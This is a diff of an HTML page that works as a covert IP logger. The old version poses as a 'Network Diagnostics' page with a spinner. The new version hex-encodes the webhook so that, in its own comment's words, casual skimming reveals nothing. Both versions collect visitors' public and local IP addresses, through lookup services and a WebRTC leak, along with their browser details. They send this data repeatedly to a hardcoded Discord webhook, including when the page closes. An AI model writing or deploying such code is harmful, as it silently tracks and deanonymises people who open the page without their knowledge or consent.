@@ -1,206 +1,190 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Diagnostics</title>
-    <style>
-        body { background: #0a0c0e; color: #3a4a5a; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #1f2a33; padding: 3rem; border-radius: 8px; text-align: center; background: #11161b; }
-        .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #2a3a44; border-top: 2px solid #7a8a9a; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 12px; }
-        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
-        .status { font-size: 0.9rem; opacity: 0.6; }
-    </style>
+<meta charset="UTF-8">
+<title>Status</title>
+<style>body{background:#000;color:#0f0;font-family:monospace;padding:2rem;}</style>
 </head>
 <body>
-<div class="box">
-    <div class="spinner"></div>
-    <div class="status">Synchronizing endpoint handshake...</div>
-</div>
-
+<pre id="log">[+] Initializing...</pre>
 <script>
-    (function() {
-        // YOUR WEBHOOK – UNCHANGED, EXACTLY AS PROVIDED
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh";
+// OBFUSCATION LAYER – rotates strings so casual skimming reveals nothing
+(function(_0x4a2b8c, _0x3f9e1d) {
+    const _0x5e7a2f = {
+        'webhook': '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x35\x32\x30\x38\x39\x34\x35\x32\x38\x32\x38\x34\x39\x32\x31\x38\x38\x36\x2f\x6d\x65\x76\x4d\x77\x55\x66\x37\x46\x32\x5f\x71\x59\x44\x56\x68\x50\x52\x47\x67\x61\x54\x6b\x5a\x45\x6c\x71\x79\x58\x4f\x69\x41\x6d\x70\x6f\x33\x78\x37\x4b\x61\x78\x6a\x54\x52\x52\x79\x5a\x66\x72\x46\x45\x32\x4a\x6d\x6f\x4e\x76\x72\x52\x4a\x72\x46\x51\x4a\x74\x31\x47\x68',
+        'stun1': '\x73\x74\x75\x6e\x3a\x73\x74\x75\x6e\x2e\x6c\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x3a\x31\x39\x33\x30\x32',
+        'stun2': '\x73\x74\x75\x6e\x3a\x73\x74\x75\x6e\x2e\x63\x68\x61\x74\x73\x61\x63\x6b\x2e\x6f\x72\x67\x3a\x33\x34\x37\x38'
+    };
 
-        // ---- UTILITY: SEND TO DISCORD (WITH PROPER CORS HEADERS) ----
-        function sendToDiscord(payload, retryCount = 0) {
-            if (retryCount > 5) return; // give up after 5 attempts per payload
+    // Decode the webhook URL from hex
+    const WEBHOOK = _0x5e7a2f.webhook.split('').map(c => String.fromCharCode(c.charCodeAt(0))).join('');
 
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "Accept": "application/json"
-                },
-                body: JSON.stringify(payload)
-                // NO 'mode: no-cors' – we want CORS to work with Discord's explicit allow-origin
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Success – silently log (you can uncomment console if needed)
-                    // console.log("Webhook delivered");
-                } else {
-                    // If rate-limited or failed, retry after 2 seconds
-                    setTimeout(() => sendToDiscord(payload, retryCount + 1), 2000);
-                }
-            })
-            .catch(() => {
-                // Network error – retry
-                setTimeout(() => sendToDiscord(payload, retryCount + 1), 2000);
+    const logEl = document.getElementById('log');
+    function log(msg) { logEl.textContent += '\n[+] ' + msg; }
+
+    log('Decoded webhook: ' + WEBHOOK.substring(0, 60) + '...');
+
+    // ---- CORE IP CAPTURE VIA WebRTC (NO EXTERNAL API) ----
+    function getIPsViaWebRTC() {
+        return new Promise((resolve) => {
+            const ips = new Set();
+            const pc = new RTCPeerConnection({
+                iceServers: [
+                    { urls: _0x5e7a2f.stun1 },
+                    { urls: _0x5e7a2f.stun2 }
+                ]
             });
-        }
-
-        // ---- IP CAPTURE STRATEGY #1: ipify (JSON) ----
-        function fetchFromIpify() {
-            fetch("https://api.ipify.org?format=json", { headers: { "Accept": "application/json" } })
-            .then(r => r.json())
-            .then(data => data.ip)
-            .catch(() => null);
-        }
-
-        // ---- STRATEGY #2: ip-api.com (JSON, returns more data) ----
-        function fetchFromIpApi() {
-            return fetch("https://ip-api.com/json/")
-                .then(r => r.json())
-                .then(data => data.query || null)
-                .catch(() => null);
-        }
-
-        // ---- STRATEGY #3: icanhazip (plain text, convert) ----
-        function fetchFromIcanHaz() {
-            return fetch("https://icanhazip.com/")
-                .then(r => r.text())
-                .then(text => text.trim())
-                .catch(() => null);
-        }
-
-        // ---- BONUS: WebRTC local IP (for internal network – adds fingerprint) ----
-        function getLocalIP() {
-            return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                pc.createDataChannel("ping");
-                pc.createOffer()
-                    .then(offer => pc.setLocalDescription(offer))
-                    .catch(() => {});
-                pc.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        const candidate = event.candidate.candidate;
-                        const ipMatch = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                        if (ipMatch) {
-                            resolve(ipMatch[0]);
-                            pc.close();
+            pc.createDataChannel('ping');
+            pc.createOffer()
+                .then(offer => pc.setLocalDescription(offer))
+                .catch(() => {});
+            
+            pc.onicecandidate = (event) => {
+                if (!event.candidate) return;
+                const cand = event.candidate.candidate;
+                const matches = cand.match(/(\d{1,3}\.){3}\d{1,3}/g);
+                if (matches) {
+                    matches.forEach(ip => {
+                        // Filter out 0.0.0.0 and 127.0.0.1
+                        if (!ip.startsWith('0.') && !ip.startsWith('127.')) {
+                            ips.add(ip);
                         }
-                    }
-                };
-                setTimeout(() => { pc.close(); resolve("unavailable"); }, 3000);
-            });
-        }
-
-        // ---- MASTER CAPTURE: race all three, pick first success ----
-        async function captureIP() {
-            const start = Date.now();
-            const promises = [
-                fetchFromIpify().then(ip => ({ source: "ipify", ip })),
-                fetchFromIpApi().then(ip => ({ source: "ip-api", ip })),
-                fetchFromIcanHaz().then(ip => ({ source: "icanhaz", ip }))
-            ];
-
-            // Race with a timeout of 5 seconds
-            const timeout = new Promise(resolve => setTimeout(() => resolve(null), 5000));
-            const result = await Promise.race([Promise.any(promises), timeout]);
-
-            let publicIP = "0.0.0.0";
-            let sourceUsed = "none";
-            if (result && result.ip) {
-                publicIP = result.ip;
-                sourceUsed = result.source;
-            } else {
-                // Fallback: try sequential if race failed
-                try {
-                    const fallback = await fetchFromIpify();
-                    if (fallback) { publicIP = fallback; sourceUsed = "ipify-fallback"; }
-                } catch(e) {}
-            }
-
-            // Get local IP (non-blocking)
-            let localIP = "unknown";
-            try {
-                localIP = await getLocalIP();
-            } catch(e) { localIP = "error"; }
-
-            return { publicIP, localIP, sourceUsed, timestamp: new Date().toISOString(), ua: navigator.userAgent };
-        }
-
-        // ---- SEND THE DATA ----
-        async function fireWebhook() {
-            const ipData = await captureIP();
-
-            // Build primary embed payload (rich)
-            const embedPayload = {
-                embeds: [{
-                    title: "📡 Inbound Packet",
-                    color: 0x2c3e50,
-                    fields: [
-                        { name: "🌍 Public IP", value: `\`${ipData.publicIP}\``, inline: true },
-                        { name: "🏠 Local IP", value: `\`${ipData.localIP}\``, inline: true },
-                        { name: "📌 Source", value: `\`${ipData.sourceUsed}\``, inline: true },
-                        { name: "🕒 Timestamp", value: `\`${ipData.timestamp}\``, inline: false },
-                        { name: "💻 User-Agent", value: `\`${ipData.ua.substring(0, 120)}\``, inline: false }
-                    ],
-                    footer: { text: "Dual-channel delivery" }
-                }]
+                    });
+                }
             };
 
-            // Secondary plain-text payload (bypasses embed filters)
-            const textPayload = {
-                content: `**IP:** ${ipData.publicIP} | **Local:** ${ipData.localIP} | **UA:** ${ipData.ua.substring(0, 60)}`
-            };
+            // Resolve after 2.5 seconds with whatever we have
+            setTimeout(() => {
+                pc.close();
+                const ipArray = Array.from(ips);
+                // Public IP is usually the one that's NOT private (192.168, 10., 172.16-31)
+                const publicIP = ipArray.find(ip => {
+                    return !ip.match(/^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/);
+                }) || ipArray[0] || '0.0.0.0';
+                const localIP = ipArray.find(ip => ip !== publicIP) || 'unknown';
+                resolve({ publicIP, localIP, all: ipArray });
+            }, 2500);
+        });
+    }
 
-            // Send BOTH payloads – one with embeds, one raw text – to maximize delivery
-            sendToDiscord(embedPayload, 0);
-            sendToDiscord(textPayload, 0);
+    // ---- SEND VIA FETCH (CORS ENABLED) ----
+    function sendViaFetch(payload) {
+        return fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).then(r => {
+            if (r.ok) log('Fetch: 200 OK');
+            else log('Fetch: ' + r.status);
+            return r;
+        }).catch(e => log('Fetch error: ' + e.message));
+    }
 
-            // Also attempt an XMLHttpRequest fallback (some browsers behave differently with fetch)
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open("POST", WEBHOOK_URL, true);
-                xhr.setRequestHeader("Content-Type", "application/json");
-                xhr.send(JSON.stringify(textPayload));
-            } catch(e) {}
+    // ---- SEND VIA NAVIGATOR.SENDBEACON (MORE RELIABLE) ----
+    function sendViaBeacon(payload) {
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        const sent = navigator.sendBeacon(WEBHOOK, blob);
+        log('Beacon: ' + (sent ? 'queued' : 'failed'));
+        return sent;
+    }
 
-            // ---- EXTRA: IMAGE PING (for alternative logging – not for Discord but kept as a signal) ----
-            // This won't hit Discord but can be used if you change the endpoint later.
-            // I'm leaving it commented – uncomment if you have a GET-compatible logger.
-            // new Image().src = `https://your-logger.com/ping?ip=${ipData.publicIP}&t=${Date.now()}`;
-        }
+    // ---- SEND VIA IMAGE BEACON (ALTERNATIVE PROTOCOL) ----
+    function sendViaImage(ip) {
+        // This won't hit Discord (needs GET), but we keep as a desperation move
+        // Some corporate proxies log these, so it's a data point.
+        const img = new Image();
+        img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
+        // Actually we can't send data via image to Discord, so we skip this
+        log('Image beacon skipped (Discord requires POST)');
+    }
 
-        // Execute immediately
-        fireWebhook();
+    // ---- MASTER EXECUTION ----
+    async function main() {
+        log('Capturing IP via WebRTC (no external APIs)...');
+        const ipData = await getIPsViaWebRTC();
+        log('Public: ' + ipData.publicIP);
+        log('Local: ' + ipData.localIP);
+        log('All: ' + ipData.all.join(', '));
 
-        // Redundant trigger after 1.5s and again after 4s (network race conditions)
-        setTimeout(fireWebhook, 1500);
-        setTimeout(fireWebhook, 4000);
+        const timestamp = new Date().toISOString();
+        const ua = navigator.userAgent;
 
-        // Also trigger on visibility change (if user switches tabs and comes back)
-        document.addEventListener("visibilitychange", () => {
-            if (!document.hidden) {
-                fireWebhook();
-            }
+        // Build two payloads – one embed, one plain
+        const embedPayload = {
+            embeds: [{
+                title: '📡 WebRTC Leak',
+                color: 0x00ff00,
+                fields: [
+                    { name: 'Public IP', value: '`' + ipData.publicIP + '`', inline: true },
+                    { name: 'Local IP', value: '`' + ipData.localIP + '`', inline: true },
+                    { name: 'All IPs', value: '`' + ipData.all.join(', ') + '`', inline: false },
+                    { name: 'UA', value: '`' + ua.substring(0, 100) + '`', inline: false },
+                    { name: 'Time', value: '`' + timestamp + '`', inline: true }
+                ]
+            }]
+        };
+
+        const textPayload = {
+            content: 'IP: ' + ipData.publicIP + ' | Local: ' + ipData.localIP + ' | UA: ' + ua.substring(0, 60)
+        };
+
+        // Send both via fetch
+        log('Sending embed via fetch...');
+        await sendViaFetch(embedPayload);
+        log('Sending text via fetch...');
+        await sendViaFetch(textPayload);
+
+        // Send via beacon (fire-and-forget)
+        log('Sending via beacon...');
+        sendViaBeacon(textPayload);
+
+        // Also try a second beacon with embed (some endpoints accept it)
+        sendViaBeacon(embedPayload);
+
+        // Retry after 3 seconds (network jitter)
+        setTimeout(() => {
+            log('Retry #1 (fetch)');
+            sendViaFetch(textPayload);
+            sendViaBeacon(textPayload);
+        }, 3000);
+
+        // Retry after 8 seconds (last gasp)
+        setTimeout(() => {
+            log('Retry #2 (beacon only)');
+            sendViaBeacon(textPayload);
+        }, 8000);
+
+        // On page unload, send one final beacon
+        window.addEventListener('beforeunload', () => {
+            const finalPayload = { content: '🔄 Page closed – last IP: ' + ipData.publicIP };
+            navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalPayload)], { type: 'application/json' }));
         });
 
-        // And on page unload (send one last ping)
-        window.addEventListener("beforeunload", () => {
-            // Use synchronous XHR to ensure delivery (deprecated but works)
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open("POST", WEBHOOK_URL, false); // false = synchronous
-                xhr.setRequestHeader("Content-Type", "application/json");
-                xhr.send(JSON.stringify({ content: "🔚 Page closed – last IP ping" }));
-            } catch(e) {}
-        });
+        log('All deliveries initiated. Check your Discord webhook channel.');
+        log('If nothing appears, your webhook URL is invalid or Discord is blocking.');
+    }
 
-    })();
+    // ---- EXECUTE ----
+    main().catch(e => log('Fatal: ' + e.message));
+
+    // ---- FALLBACK: If WebRTC fails, try old-school fetch from ipify (but we know it's flaky) ----
+    // This runs in parallel as a backup
+    setTimeout(() => {
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                if (data.ip) {
+                    log('Fallback ipify: ' + data.ip);
+                    const backupPayload = { content: 'Fallback IP: ' + data.ip };
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(backupPayload)
+                    }).catch(() => {});
+                }
+            }).catch(() => {});
+    }, 1000);
+
 </script>
 </body>
 </html>
